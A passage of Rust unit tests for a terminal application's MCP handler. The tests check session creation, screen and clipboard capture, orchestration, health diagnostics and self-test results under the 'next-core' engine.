            assert_eq!(item["lifecycle"]["window_owner"], "none");
            assert_eq!(item["lifecycle"]["values_redacted"], true);
        }
        assert_eq!(list["registry"]["owner"], "server_info");
        assert!(list["registry"]["active_source"].is_string());
        assert!(list["registry"]["live_count"].is_number());
        assert!(list["registry"]["stale_removed"].is_number());
        assert!(list["registry"]["corrupt_files"].is_number());
        assert!(list["registry"]["empty_files"].is_number());
        assert!(list["registry"]["unreadable_files"].is_number());
        assert_eq!(list["registry"]["values_redacted"], true);
        assert_eq!(lifecycle["owner"], "server_info");
        assert_eq!(lifecycle["operation"], "dry_run");
        assert_eq!(lifecycle["plan"]["registration_owner"], "server_info");
        assert_eq!(
            lifecycle["plan"]["shutdown"]["native_window_lifecycle"],
            "none"
        );
        assert_eq!(lifecycle["native_window"]["owner"], "none");
        assert_eq!(lifecycle["native_window"]["can_close_from_mcp"], false);
        assert_eq!(lifecycle["values_redacted"], true);
        assert_eq!(close["ok"], true);
        assert_eq!(close["operation"], "dry_run");
        assert_eq!(close["requires_confirm"], "unregister-current-instance");
        assert_eq!(close["native_window"]["owner"], "none");
        assert_eq!(close["native_window"]["closed"], false);
        assert_eq!(close["values_redacted"], true);
        assert_eq!(title["ok"], true);
        assert!(title["title"].is_null());
        assert_eq!(title["window"]["engine"], "next-core");
        assert_eq!(title["window"]["title_owner"], "server_info");
        assert_eq!(title["window"]["metadata_owner"], "product_registry");
        assert_eq!(title["window"]["applied_to_native_window"], false);
        assert_eq!(title["window"]["uses_host_window"], false);
        assert_eq!(title["lifecycle"]["title_owner"], "server_info");
        assert_eq!(title["lifecycle"]["metadata_owner"], "product_registry");
        assert_eq!(title["lifecycle"]["native_window_lifecycle"], "none");
        assert_eq!(title["lifecycle"]["uses_host_window"], false);
        assert_eq!(title["lifecycle"]["values_redacted"], true);
        if let Err(err) = focus {
            let message = format!("{err:#}");
            assert!(
                !message.contains("Mux not available"),
                "instance.focus should not require WezTerm mux: {}",
                message
            );
        }
    }

    #[test]
    fn ghost_debug_reads_product_registry_by_pane_id() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result: Result<(serde_json::Value, usize)> = (|| {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let created = handler.handle(
                &ctx,
                "session.create",
                &json!({
                    "cols": 80,
                    "rows": 4,
                }),
            )?;
            let pane_id = created["id"].as_u64().expect("session id") as usize;
            unterm_services::ghost_text::observe(
                pane_id as u64,
                unterm_services::ghost_text::InputEvent::Cancel,
                &[],
            );
            for ch in "git status".chars() {
                unterm_services::ghost_text::observe(
                    pane_id as u64,
                    unterm_services::ghost_text::InputEvent::Char(ch),
                    &[],
                );
            }
            unterm_services::ghost_text::observe(
                pane_id as u64,
                unterm_services::ghost_text::InputEvent::Enter,
                &[],
            );
            unterm_services::ghost_text::observe(
                pane_id as u64,
                unterm_services::ghost_text::InputEvent::Char('g'),
                &[],
            );
            let debug = handler.handle(&ctx, "ghost.debug", &json!({ "pane_id": pane_id }))?;
            let _ = handler.handle(&ctx, "session.destroy", &json!({ "pane_id": pane_id }));
            Ok((debug, pane_id))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (debug, pane_id) = result.expect("read ghost debug without WezTerm mux");
        assert!(next_core().get_session(pane_id).is_err());
        assert_eq!(debug["input_buffer"], "g");
        assert_eq!(debug["ghost"], "it status");
        assert_eq!(debug["input_buffer_len"], 1);
    }

    #[test]
    fn capture_clipboard_does_not_require_terminal_engine() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result = {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            handler.handle(&ctx, "capture.clipboard", &json!({}))
        };

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        if let Err(err) = result {
            let message = format!("{err:#}");
            assert!(
                !message.contains("Mux not available"),
                "clipboard capture should not require WezTerm mux: {}",
                message
            );
        }
    }

    #[test]
    fn capture_screen_text_snapshot_uses_terminal_engine() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result: Result<(Result<Value>, usize)> = (|| {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let created = handler.handle(
                &ctx,
                "session.create",
                &json!({
                    "cols": 80,
                    "rows": 4,
                    "command": "echo next-core-capture-screen"
                }),
            )?;
            let pane_id = created["id"].as_u64().expect("session id") as usize;
            wait_for_screen_pattern(&handler, &ctx, pane_id, "next-core-capture-screen")?;
            let capture =
                handler.handle(&ctx, "capture.screen", &json!({ "include_base64": false }));
            let _ = handler.handle(&ctx, "session.destroy", &json!({ "pane_id": pane_id }));
            Ok((capture, pane_id))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (capture_result, pane_id) =
            result.expect("create next-core session for capture.screen");
        assert!(next_core().get_session(pane_id).is_err());
        match capture_result {
            Ok(capture) => {
                assert!(capture["captures"].is_array());
                assert_eq!(capture["text_snapshot"], true);
                let captures = capture["captures"].as_array().expect("captures");
                assert!(captures
                    .iter()
                    .any(|item| item["session_id"] == pane_id.to_string()
                        && item["screen"]
                            .as_str()
                            .unwrap_or_default()
                            .contains("next-core-capture-screen")));
            }
            Err(err) => {
                let message = format!("{err:#}");
                assert!(
                    !message.contains("Mux not available"),
                    "screen text snapshot should not require WezTerm mux: {}",
                    message
                );
            }
        }
    }

    #[test]
    fn capture_window_text_snapshot_uses_terminal_engine() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result: Result<(Result<Value>, usize)> = (|| {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let created = handler.handle(
                &ctx,
                "session.create",
                &json!({
                    "cols": 80,
                    "rows": 4,
                    "command": "echo next-core-capture-window"
                }),
            )?;
            let pane_id = created["id"].as_u64().expect("session id") as usize;
            wait_for_screen_pattern(&handler, &ctx, pane_id, "next-core-capture-window")?;
            let capture = handler.handle(
                &ctx,
                "capture.window",
                &json!({
                    "title": pane_id.to_string(),
                    "include_base64": false
                }),
            );
            let _ = handler.handle(&ctx, "session.destroy", &json!({ "pane_id": pane_id }));
            Ok((capture, pane_id))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (capture_result, pane_id) =
            result.expect("create next-core session for capture.window");
        assert!(next_core().get_session(pane_id).is_err());
        match capture_result {
            Ok(capture) => {
                assert_eq!(capture["session_id"], pane_id.to_string());
                assert_eq!(capture["text_snapshot"], true);
                assert!(capture["screen"]
                    .as_str()
                    .unwrap_or_default()
                    .contains("next-core-capture-window"));
            }
            Err(err) => {
                let message = format!("{err:#}");
                assert!(
                    !message.contains("Mux not available"),
                    "window text snapshot should not require WezTerm mux: {}",
                    message
                );
            }
        }
    }

    #[test]
    fn orchestrate_methods_use_next_core_sessions_and_screen() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");
        let test_agent = "handler-test-orchestrate";
        let test_conn_id = 42_000_001;
        let was_trusted = {
            let mut state = mcp_state().lock();
            !state.confirmed_agents.insert(test_agent.to_string())
        };
        // `confirmed_agents` covers the write banner and deliberately not the
        // destructive gate: an "always allow" clicked on a terminal write
        // must not become permission to destroy things. This test's teardown
        // destroys its own sessions, so it grants itself that separately —
        // exactly what a user clicking "always allow" on a destructive banner
        // would produce.
        super::grant_agent_trust(test_agent, "destructive");

        let result: Result<(
            serde_json::Value,
            serde_json::Value,
            serde_json::Value,
            usize,
            usize,
        )> = (|| {
            let handler = McpHandler::new();
            let ctx = ConnectionContext {
                conn_id: test_conn_id,
                peer_addr: "internal:handler-test".to_string(),
            };
            handler.handle(
                &ctx,
                "agent.identify",
                &json!({
                    "name": test_agent,
                    "version": "test",
                }),
            )?;
            let launched = handler.handle(
                &ctx,
                "orchestrate.launch",
                &json!({
                    "cols": 80,
                    "rows": 4,
                    "command": "echo next-core-orchestrate-launch"
                }),
            )?;
            let first_id = launched["id"].as_u64().expect("launched id") as usize;
            let launch_wait = handler.handle(
                &ctx,
                "orchestrate.wait",
                &json!({
                    "pane_id": first_id,
                    "pattern": "next-core-orchestrate-launch",
                    "timeout_ms": 3000,
                }),
            )?;

            let created = handler.handle(
                &ctx,
                "session.create",
                &json!({
                    "cols": 80,
                    "rows": 4,
                }),
            )?;
            let second_id = created["id"].as_u64().expect("second id") as usize;
            std::thread::sleep(std::time::Duration::from_millis(300));
            let broadcast = handler.handle(
                &ctx,
                "orchestrate.broadcast",
                &json!({
                    "sessions": [first_id.to_string(), second_id.to_string()],
                    "command": "echo next-core-orchestrate-broadcast",
                }),
            )?;
            let first_broadcast_wait = handler.handle(
                &ctx,
                "orchestrate.wait",
                &json!({
                    "pane_id": first_id,
                    "pattern": "next-core-orchestrate-broadcast",
                    "timeout_ms": 3000,
                }),
            )?;
            let second_broadcast_wait = handler.handle(
                &ctx,
                "orchestrate.wait",
                &json!({
                    "pane_id": second_id,
                    "pattern": "next-core-orchestrate-broadcast",
                    "timeout_ms": 3000,
                }),
            )?;
            // Torn down under the engine rather than through the gate: a
            // destructive action is answered one call at a time now, and a
            // test's cleanup should not have to hold a permission to happen.
            // What the handler does with `session.destroy` has its own test.
            next_core().destroy_session(first_id).ok();
            next_core().destroy_session(second_id).ok();
            Ok((
                launch_wait,
                broadcast,
                json!([first_broadcast_wait, second_broadcast_wait]),
                first_id,
                second_id,
            ))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }
        {
            let mut state = mcp_state().lock();
            if !was_trusted {
                state.confirmed_agents.remove(test_agent);
            }
            state.agents_by_connection.remove(&test_conn_id);
        }

        let (launch_wait, broadcast, broadcast_waits, first_id, second_id) =
            result.expect("orchestrate methods use next-core sessions");
        assert!(next_core().get_session(first_id).is_err());
        assert!(next_core().get_session(second_id).is_err());
        assert_eq!(launch_wait["matched"], true);
        assert_eq!(launch_wait["pattern"], "next-core-orchestrate-launch");

        let results = broadcast["results"].as_array().expect("broadcast results");
        assert_eq!(results.len(), 2);
        assert!(results
            .iter()
            .any(|item| item["session_id"] == first_id.to_string() && item["sent"] == true));
        assert!(results
            .iter()
            .any(|item| item["session_id"] == second_id.to_string() && item["sent"] == true));
        let waits = broadcast_waits.as_array().expect("broadcast waits");
        assert!(waits.iter().all(|item| item["matched"] == true));
    }

    #[test]
    fn capture_scrollback_routes_through_capture_engine() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result = {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            handler.handle(&ctx, "capture.scrollback", &json!({}))
        };

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        match result {
            Ok(capture) => {
                assert_eq!(capture["type"], "image/png");
            }
            Err(err) => {
                let message = format!("{err:#}");
                assert!(
                    !message.contains("Mux not available"),
                    "capture.scrollback should not require handler access to WezTerm mux: {}",
                    message
                );
            }
        }
    }

    #[test]
    fn capture_scrollback_rejects_stale_explicit_pane_id() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result = (|| -> Result<(Result<serde_json::Value>, usize)> {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let created = handler.handle(
                &ctx,
                "session.create",
                &json!({
                    "cols": 80,
                    "rows": 4,
                    "command": "echo stale-capture"
                }),
            )?;
            let pane_id = created["id"].as_u64().expect("session id") as usize;
            let _ = handler.handle(&ctx, "session.destroy", &json!({ "pane_id": pane_id }));
            let capture =
                handler.handle(&ctx, "capture.scrollback", &json!({ "pane_id": pane_id }));
            Ok((capture, pane_id))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (capture, pane_id) = result.expect("stale capture setup");
        assert!(next_core().get_session(pane_id).is_err());
        let err = capture.expect_err("stale explicit pane id should be rejected");
        let message = format!("{err:#}");
        assert!(
            message.contains("resolve pane"),
            "expected stale pane resolution error, got: {}",
            message
        );
    }

    #[test]
    fn product_capture_methods_do_not_require_terminal_engine() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result: Result<()> = (|| {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            for (method, params) in [
                ("capture.select", json!({})),
                ("capture.window_scroll", json!({ "title": "handler-test" })),
            ] {
                if let Err(err) = handler.handle(&ctx, method, &params) {
                    let message = format!("{err:#}");
                    assert!(
                        !message.contains("Mux not available"),
                        "{method} should not require WezTerm mux: {}",
                        message
                    );
                }
            }
            Ok(())
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        result.expect("product capture methods do not require WezTerm mux");
    }

    #[test]
    fn server_health_uses_selected_next_core_engine() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result: Result<serde_json::Value> = (|| {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            handler.handle(&ctx, "server.health", &json!({}))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let health = result.expect("server.health through MCP handler");
        assert_eq!(health["status"], "ok");
        assert_eq!(health["engine"], "Unterm (next-core)");
        assert_eq!(health["engine_health"]["engine"], "next-core");
        assert_eq!(health["engine_health"]["ready"], true);
        assert_eq!(health["mux"]["available"], false);
    }

    #[test]
    fn server_health_exposes_next_core_io_summary() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result: Result<(serde_json::Value, usize)> = (|| {
            let engine = next_core();
            let command = if cfg!(windows) {
                "echo next-core-health-io && ping -n 30 127.0.0.1 >nul"
            } else {
                "echo next-core-health-io; sleep 30"
            };
            let session = engine.create_session(CreateSessionRequest {
                cols: 80,
                rows: 4,
                command_dir: None,
                command: Some(shell_command_builder(command)),
                env: Vec::new(),
                launch_policy: Default::default(),
            })?;
            let pane_id = session.id;

            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            for _ in 0..20 {
                let search = handler.handle(
                    &ctx,
                    "screen.search",
                    &json!({
                        "pane_id": pane_id,
                        "pattern": "next-core-health-io",
                    }),
                )?;
                if search["total"].as_u64().unwrap_or_default() > 0 {
                    break;
                }
                std::thread::sleep(std::time::Duration::from_millis(50));
            }

            engine.write_input(pane_id, "abc")?;
            engine.paste_input(pane_id, "AUTH-CODE-123456")?;

            let health = handler.handle(&ctx, "server.health", &json!({}))?;
            let _ = handler.handle(&ctx, "session.destroy", &json!({ "pane_id": pane_id }));
            Ok((health, pane_id))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (health, pane_id) = result.expect("server.health exposes next-core io summary");
        assert!(next_core().get_session(pane_id).is_err());
        let io = &health["engine_health"]["io"];
        assert!(io["input_writes"].as_u64().unwrap_or_default() >= 2);
        assert!(io["input_bytes"].as_u64().unwrap_or_default() >= 19);
        assert!(io["output_chunks"].as_u64().unwrap_or_default() > 0);
        assert!(io["output_bytes"].as_u64().unwrap_or_default() > 0);
        assert_eq!(io["paste_count"], 1);
        assert_eq!(io["paste_text_bytes"], 16);
        let confirmation = &health["mcp"]["input_confirmation"];
        assert_eq!(confirmation["engine_neutral"], true);
        assert_eq!(confirmation["requires_wezterm_pane_object"], false);
        assert!(confirmation["policy"].is_string());
        assert!(confirmation["timeout_ms"].as_u64().unwrap_or_default() >= 1000);
    }

    #[test]
    fn capability_surfaces_expose_next_core_health_io_diagnostics() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result: Result<(serde_json::Value, serde_json::Value)> = (|| {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let surface = handler.handle(&ctx, "meta.surface", &json!({}))?;
            let capabilities = handler.handle(&ctx, "server.capabilities", &json!({}))?;
            Ok((surface, capabilities))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (surface, capabilities) =
            result.expect("capability surfaces expose selected engine diagnostics");
        assert_eq!(surface["engine"], "next-core");
        assert_eq!(
            surface["engine_capabilities"]["diagnostics"]["health_io_summary"],
            true
        );
        assert_eq!(
            surface["engine_capabilities"]["diagnostics"]["runtime_pump_summary"],
            true
        );
        assert_eq!(
            surface["engine_capabilities"]["diagnostics"]["launch_context"],
            true
        );
        assert_eq!(
            surface["engine_capabilities"]["diagnostics"]["session_create_launch_decision"],
            true
        );
        assert_eq!(
            surface["engine_capabilities"]["diagnostics"]["styled_scrollback_png"],
            false
        );
        assert_eq!(
            surface["engine_capabilities"]["diagnostics"]["styled_scrollback_renderer_metadata"],
            true
        );
        assert_eq!(
            surface["engine_capabilities"]["diagnostics"]["pty_write_confirmation"],
            true
        );
        assert_eq!(
            surface["engine_capabilities"]["diagnostics"]["recording_block_markdown"],
            true
        );
        assert_eq!(
            surface["engine_capabilities"]["diagnostics"]["recording_osc133_command_blocks"],
            true
        );
        assert_eq!(
            surface["engine_capabilities"]["diagnostics"]["validated_capture_scrollback_pane_ids"],
            true
        );
        assert_eq!(
            surface["engine_capabilities"]["diagnostics"]["host_window_bridge"],
            true
        );
        assert_eq!(
            surface["engine_capabilities"]["diagnostics"]["instance_title_bridge"],
            true
        );
        assert_eq!(
            surface["engine_capabilities"]["diagnostics"]["instance_lifecycle_observability"],
            true
        );
        assert_eq!(
            surface["engine_capabilities"]["diagnostics"]["instance_registry_diagnostics"],
            true
        );
        assert_eq!(
            surface["engine_capabilities"]["diagnostics"]["instance_shutdown_dry_run"],
            true
        );
        assert_eq!(
            surface["engine_capabilities"]["diagnostics"]["instance_registry_unregister"],
            true
        );
        assert_eq!(
            surface["engine_capabilities"]["diagnostics"]["native_window_lifecycle"],
            false
        );
        assert_eq!(capabilities["_engine"], "next-core");
        assert_eq!(
            capabilities["_engine_capabilities"]["diagnostics"]["health_io_summary"],
            true
        );
        assert_eq!(
            capabilities["_engine_capabilities"]["diagnostics"]["runtime_pump_summary"],
            true
        );
        assert_eq!(
            capabilities["_engine_capabilities"]["diagnostics"]["launch_context"],
            true
        );
        assert_eq!(
            capabilities["_engine_capabilities"]["diagnostics"]["session_create_launch_decision"],
            true
        );
        // The renderer belongs to a front end, and none is hosting a test.
        assert_eq!(
            capabilities["_engine_capabilities"]["diagnostics"]["styled_scrollback_png"],
            false
        );
        assert_eq!(
            capabilities["_engine_capabilities"]["diagnostics"]
                ["styled_scrollback_renderer_metadata"],
            true
        );
        assert_eq!(
            capabilities["_engine_capabilities"]["diagnostics"]["pty_write_confirmation"],
            true
        );
        assert_eq!(
            capabilities["_engine_capabilities"]["diagnostics"]["recording_block_markdown"],
            true
        );
        assert_eq!(
            capabilities["_engine_capabilities"]["diagnostics"]["recording_osc133_command_blocks"],
            true
        );
        assert_eq!(
            capabilities["_engine_capabilities"]["diagnostics"]
                ["validated_capture_scrollback_pane_ids"],
            true
        );
        assert_eq!(
            capabilities["_engine_capabilities"]["diagnostics"]["host_window_bridge"],
            true
        );
        assert_eq!(
            capabilities["_engine_capabilities"]["diagnostics"]["instance_title_bridge"],
            true
        );
        assert_eq!(
            capabilities["_engine_capabilities"]["diagnostics"]["instance_lifecycle_observability"],
            true
        );
        assert_eq!(
            capabilities["_engine_capabilities"]["diagnostics"]["instance_registry_diagnostics"],
            true
        );
        assert_eq!(
            capabilities["_engine_capabilities"]["diagnostics"]["instance_shutdown_dry_run"],
            true
        );
        assert_eq!(
            capabilities["_engine_capabilities"]["diagnostics"]["instance_registry_unregister"],
            true
        );
        assert_eq!(
            capabilities["_engine_capabilities"]["diagnostics"]["native_window_lifecycle"],
            false
        );
        let metrics = surface["engine_capabilities"]["diagnostics"]["health_metrics"]
            .as_array()
            .expect("health metrics");
        assert!(metrics.iter().any(|metric| metric == "input_writes"));
        assert!(metrics.iter().any(|metric| metric == "output_bytes"));
        assert!(metrics.iter().any(|metric| metric == "paste_count"));
        let pump_metrics = surface["engine_capabilities"]["diagnostics"]["runtime_pump_metrics"]
            .as_array()
            .expect("runtime pump metrics");
        assert!(pump_metrics.iter().any(|metric| metric == "drain_calls"));
        assert!(pump_metrics
            .iter()
            .any(|metric| metric == "dispatched_commands"));
        assert!(pump_metrics
            .iter()
            .any(|metric| metric == "dispatched_screen_commands"));
        assert!(pump_metrics
            .iter()
            .any(|metric| metric == "waited_for_response"));
        assert!(pump_metrics
            .iter()
            .any(|metric| metric == "completed_without_wait"));
        assert!(pump_metrics
            .iter()
            .any(|metric| metric == "max_dispatch_elapsed_micros"));
    }

    #[test]
    fn selftest_run_uses_selected_terminal_engine() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result: Result<serde_json::Value> = (|| {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            handler.handle(&ctx, "selftest.run", &json!({}))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let selftest = result.expect("selftest.run through selected engine");
        let checks = selftest["checks"].as_array().expect("checks array");
        assert!(checks
            .iter()
            .all(|check| check["name"].as_str() != Some("mux.available")));
        let engine_check = checks
            .iter()
            .find(|check| check["name"] == "engine.available")
            .expect("engine availability check");
        assert_eq!(engine_check["ok"], true);
        assert_eq!(engine_check["detail"]["engine"], "next-core");
        let io_check = checks
            .iter()
            .find(|check| check["name"] == "next_core.health_io_diagnostics")
            .expect("next-core health io diagnostics check");
        assert_eq!(io_check["ok"], true);
        let metrics = io_check["detail"]["advertised_metrics"]
            .as_array()
            .expect("advertised metrics");
        assert!(metrics.iter().any(|metric| metric == "input_writes"));
        assert!(metrics.iter().any(|metric| metric == "output_bytes"));
        assert!(metrics.iter().any(|metric| metric == "paste_count"));
        let pump_check = checks
            .iter()
            .find(|check| check["name"] == "next_core.runtime_pump_diagnostics")
            .expect("next-core runtime pump diagnostics check");
        assert_eq!(pump_check["ok"], true);
        let pump_metrics = pump_check["detail"]["advertised_metrics"]
            .as_array()
            .expect("advertised pump metrics");
        assert!(pump_metrics.iter().any(|metric| metric == "drain_calls"));
        assert!(pump_metrics
            .iter()
            .any(|metric| metric == "dispatched_commands"));
        assert!(pump_metrics
            .iter()
            .any(|metric| metric == "waited_for_response"));
        assert!(pump_metrics
            .iter()
            .any(|metric| metric == "completed_without_wait"));
        assert!(pump_check["detail"]["runtime_pump"]["drain_calls"]
            .as_u64()
            .is_some());
        let scroll_check = checks
            .iter()
            .find(|check| check["name"] == "next_core.screen_scroll_viewport")
            .expect("next-core screen scroll viewport check");
        assert_eq!(scroll_check["ok"], true);
        assert_eq!(scroll_check["detail"]["found_tail"], true);
        assert_eq!(scroll_check["detail"]["scrolled"], true);
        assert_eq!(scroll_check["detail"]["target_visible"], true);
        assert_eq!(scroll_check["detail"]["destroyed"], true);
        let styled_capture_check = checks
            .iter()
            .find(|check| check["name"] == "next_core.styled_scrollback_capture")
            .expect("next-core styled scrollback capture check");
        // No front end hosts a test binary, so the renderer check does not
        // apply here; it is exercised where a host exists.
        assert_eq!(styled_capture_check["ok"], true);
        assert_eq!(styled_capture_check["detail"]["advertised"], false);
        assert_eq!(
            styled_capture_check["detail"]["skipped"],
            "no front end is hosting this MCP surface"
        );
        let launch_check = checks
            .iter()
            .find(|check| check["name"] == "next_core.launch_context_diagnostics")
            .expect("next-core launch context diagnostics check");
        assert_eq!(launch_check["ok"], true);
        assert_eq!(launch_check["detail"]["profile"], "selftest-profile");
        assert_eq!(launch_check["detail"]["proxy_key"], "HTTPS_PROXY");
        assert_eq!(
            launch_check["detail"]["policy_domain_decision"],
            "not_requested"
        );
        assert_eq!(
            launch_check["detail"]["policy_privilege_decision"],
            "not_requested"
        );
        assert_eq!(
            launch_check["detail"]["policy_proxy_rotation_decision"],
            "deferred"
        );
        assert_eq!(
            launch_check["detail"]["policy_restart_decision"],
            "not_requested"
        );
        assert_eq!(launch_check["detail"]["values_redacted"], true);
        assert_eq!(launch_check["detail"]["destroyed"], true);
    }

    #[test]
    fn product_system_methods_do_not_require_terminal_engine() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result: Result<(serde_json::Value, serde_json::Value)> = (|| {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let info = handler.handle(&ctx, "system.info", &json!({}))?;
            let admin = handler.handle(
                &ctx,
                "system.launch_admin",
                &json!({ "dry_run": true, "shell": "pwsh" }),
            );
            match admin {
                Ok(admin) => Ok((info, admin)),
                Err(err) if cfg!(not(windows)) => {
                    Ok((info, json!({ "unsupported": err.to_string() })))
                }
                Err(err) => Err(err),
            }
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (info, admin) = result.expect("read product system methods without WezTerm mux");
        assert_eq!(info["engine"], "Unterm (next-core)");
        assert_eq!(info["os"], std::env::consts::OS);
        assert_eq!(info["arch"], std::env::consts::ARCH);
        assert!(info["hostname"].is_string());
        assert!(info["locale"].is_string());
        assert!(info["version"].is_string());
        assert!(info["active_sessions"].is_number());
        assert!(info.get("active_session").is_some());
        assert!(admin.get("status").is_some() || admin.get("unsupported").is_some());
    }

    #[test]
    fn agent_cwd_metadata_uses_selected_terminal_engine() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result: Result<(serde_json::Value, super::PaneAgentCwd)> = (|| {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let cwd = std::env::current_dir()?.display().to_string();
            let created = handler.handle(
                &ctx,
                "session.create",
                &json!({
                    "cols": 80,
                    "rows": 4,
                    "cwd": cwd,
                }),
            )?;
            let pane_id = created["id"].as_u64().expect("session id");
            let metadata = compute_agent_cwd(pane_id);
            let _ = handler.handle(&ctx, "session.destroy", &json!({ "pane_id": pane_id }));
            Ok((created, metadata))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (_created, metadata) = result.expect("agent cwd metadata through selected engine");
        assert!(metadata.cwd_path.is_some());
        assert!(metadata.cwd.is_some());
        assert!(metadata.project_path.is_some());
    }

    #[test]
    fn session_suggest_uses_terminal_engine_session_lookup() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result: Result<serde_json::Value> = (|| {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let created = handler.handle(
                &ctx,
                "session.create",
                &json!({
                    "cols": 80,
                    "rows": 4,
                }),
            )?;
            let pane_id = created["id"].as_u64().expect("session id") as usize;
            let suggest = handler.handle(
                &ctx,
                "session.suggest",
                &json!({
                    "pane_id": pane_id,
                    "text": "git status",
                }),
            );
            let _ = handler.handle(&ctx, "session.destroy", &json!({ "pane_id": pane_id }));
            suggest
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let suggest = result.expect("queue suggestion without WezTerm mux");
        assert_eq!(suggest["status"], "queued");
        assert!(suggest["suggestion_id"].as_str().is_some());
    }

    #[test]
    fn screen_scrollback_text_resolves_active_next_core_session_without_pane_param() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result: Result<(serde_json::Value, usize)> = (|| {
            let engine = next_core();
